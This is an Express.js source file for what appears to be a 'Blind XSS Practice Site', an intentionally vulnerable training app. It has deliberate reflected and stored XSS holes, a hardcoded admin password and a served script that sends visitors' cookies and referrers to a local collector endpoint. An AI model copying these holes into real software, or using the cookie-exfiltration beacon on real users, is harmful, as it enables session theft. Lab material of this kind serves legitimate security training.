const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const app = express();
const PORT = 3000;

// Set up view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public'));

// Initialize database
const db = new sqlite3.Database('./xss_data.db');

db.serialize(() => {
  // Create tables for storing user inputs
  db.run(`CREATE TABLE IF NOT EXISTS comments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    comment TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS contact_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    email TEXT,
    message TEXT,
    user_agent TEXT,
    ip_address TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS xss_payloads (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    payload TEXT,
    referer TEXT,
    user_agent TEXT,
    ip_address TEXT,
    cookies TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

// Vulnerable routes

// Route 1: Comment form with stored XSS vulnerability
app.get('/', (req, res) => {
  const page = req.query.page || 'home';
  // Vulnerable to reflected XSS in the 'page' parameter
  res.render('index', { page });
});

app.get('/comments', (req, res) => {
  // Retrieve and display comments without sanitization
  db.all('SELECT * FROM comments ORDER BY created_at DESC', [], (err, rows) => {
    if (err) {
      console.error(err);
      res.status(500).send('Database error');
      return;
    }
    res.render('comments', { comments: rows });
  });
});

app.post('/comments', (req, res) => {
  const { name, comment } = req.body;
  // Vulnerable: No sanitization of user input before storing
  const stmt = db.prepare('INSERT INTO comments (name, comment) VALUES (?, ?)');
  stmt.run([name, comment], function(err) {
    if (err) {
      console.error(err);
      res.status(500).send('Database error');
      return;
    }
    res.redirect('/comments');
  });
  stmt.finalize();
});

// Route 2: Contact form with stored XSS in User-Agent header
app.get('/contact', (req, res) => {
  res.render('contact');
});

app.post('/contact', (req, res) => {
  const { name, email, message } = req.body;
  const userAgent = req.get('User-Agent');
  const ipAddress = req.ip;
  
  // Vulnerable: Storing User-Agent without sanitization
  const stmt = db.prepare('INSERT INTO contact_messages (name, email, message, user_agent, ip_address) VALUES (?, ?, ?, ?, ?)');
  stmt.run([name, email, message, userAgent, ipAddress], function(err) {
    if (err) {
      console.error(err);
      res.status(500).send('Database error');
      return;
    }
    res.redirect('/contact-success');
  });
  stmt.finalize();
});

app.get('/contact-success', (req, res) => {
  // Display contact messages including User-Agent without sanitization
  db.all('SELECT * FROM contact_messages ORDER BY created_at DESC LIMIT 5', [], (err, rows) => {
    if (err) {
      console.error(err);
      res.status(500).send('Database error');
      return;
    }
    res.render('contact-success', { messages: rows });
  });
});

// Route 3: XSS payload receiver
app.get('/xss-payload', (req, res) => {
  // Send back a simple HTML page that will execute the XSS payload
  res.send(`
    <html>
      <head>
        <title>XSS Test Page</title>
      </head>
      <body>
        <h1>Blind XSS Test Page</h1>
        <p>This page is intentionally vulnerable to XSS.</p>
        <script>
          // Capture and send data to our payload receiver
          var data = {
            payload: document.location.href,
            referer: document.referrer,
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            url: window.location.href
          };
          
          // Send data to our blind XSS receiver
          var img = new Image();
          img.src = 'http://localhost:3000/collect-xss?' + encodeURIComponent(JSON.stringify(data));
        </script>
      </body>
    </html>
  `);
});

// Route to collect XSS payloads
app.get('/collect-xss', (req, res) => {
  // This endpoint receives data from XSS payloads
  const payloadData = req.query.data || req.query[''] || JSON.stringify(req.query);
  const userAgent = req.get('User-Agent');
  const referer = req.get('Referer');
  const ipAddress = req.ip;
  
  // Store the XSS payload data
  const stmt = db.prepare('INSERT INTO xss_payloads (payload, referer, user_agent, ip_address) VALUES (?, ?, ?, ?)');
  stmt.run([payloadData, referer, userAgent, ipAddress], function(err) {
    if (err) {
      console.error(err);
    }
  });
  stmt.finalize();
  
  // Send back a blank image to complete the request
  res.set('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// Admin panel to view collected XSS payloads (vulnerable to XSS as well)
app.get('/admin', (req, res) => {
  // Simple password protection (vulnerable - password in source code)
  const password = req.query.password;
  if (password !== 'admin123') {
    res.send(`
      <form method="GET">
        <label>Admin Password:</label><br>
        <input type="password" name="password"><br>
        <input type="submit" value="Login">
      </form>
    `);
    return;
  }
  
  // Display collected XSS payloads (stored XSS vulnerability)
  db.all('SELECT * FROM xss_payloads ORDER BY timestamp DESC', [], (err, rows) => {
    if (err) {
      console.error(err);
      res.status(500).send('Database error');
      return;
    }
    
    let html = '<h2>Collected XSS Payloads</h2><table border="1"><tr><th>ID</th><th>Payload</th><th>Referer</th><th>User Agent</th><th>IP Address</th><th>Timestamp</th></tr>';
    rows.forEach(row => {
      // Vulnerable: Directly outputting stored data without sanitization
      html += `<tr><td>${row.id}</td><td>${row.payload}</td><td>${row.referer}</td><td>${row.user_agent}</td><td>${row.ip_address}</td><td>${row.timestamp}</td></tr>`;
    });
    html += '</table><br><a href="/">Home</a>';
    
    res.send(html);
  });
});

// Route 4: Vulnerable search functionality
app.get('/search', (req, res) => {
  const query = req.query.q;
  // Vulnerable: Directly outputting search query without sanitization (Reflected XSS)
  res.send(`
    <h1>Search Results for: ${query || ''}</h1>
    <p>No results found for your query.</p>
    <form action="/search" method="GET">
      <input type="text" name="q" value="${query || ''}">
      <input type="submit" value="Search">
    </form>
    <br><a href="/">Home</a>
  `);
});

// Route 5: User profile with potential XSS
app.get('/profile/:username', (req, res) => {
  const username = req.params.username;
  // Vulnerable: Direct insertion of user input into HTML
  res.send(`
    <h1>User Profile: ${username}</h1>
    <p>Welcome to ${username}'s profile page!</p>
    <br><a href="/">Home</a>
  `);
});

// Serve index page
app.get('/home', (req, res) => {
  res.render('home');
});

app.get('*', (req, res) => {
  const page = req.url.substring(1); // Get everything after the slash
  // Vulnerable: Direct insertion of URL into HTML
  res.send(`
    <h1>Page: ${page}</h1>
    <p>The page ${page} does not exist.</p>
    <br><a href="/">Home</a>
  `);
});

app.listen(PORT, () => {
  console.log(`Blind XSS Practice Site running on http://localhost:${PORT}`);
  console.log('Vulnerable endpoints:');
  console.log('- Home: http://localhost:3000/');
  console.log('- Comments: http://localhost:3000/comments');
  console.log('- Contact: http://localhost:3000/contact');
  console.log('- Search: http://localhost:3000/search?q=test');
  console.log('- Profile: http://localhost:3000/profile/test');
  console.log('- Admin: http://localhost:3000/admin (password: admin123)');
  console.log('');
  console.log('XSS Payload Collector: http://localhost:3000/xss-payload');
  console.log('To test blind XSS, try injecting payloads in comment forms or headers.');
});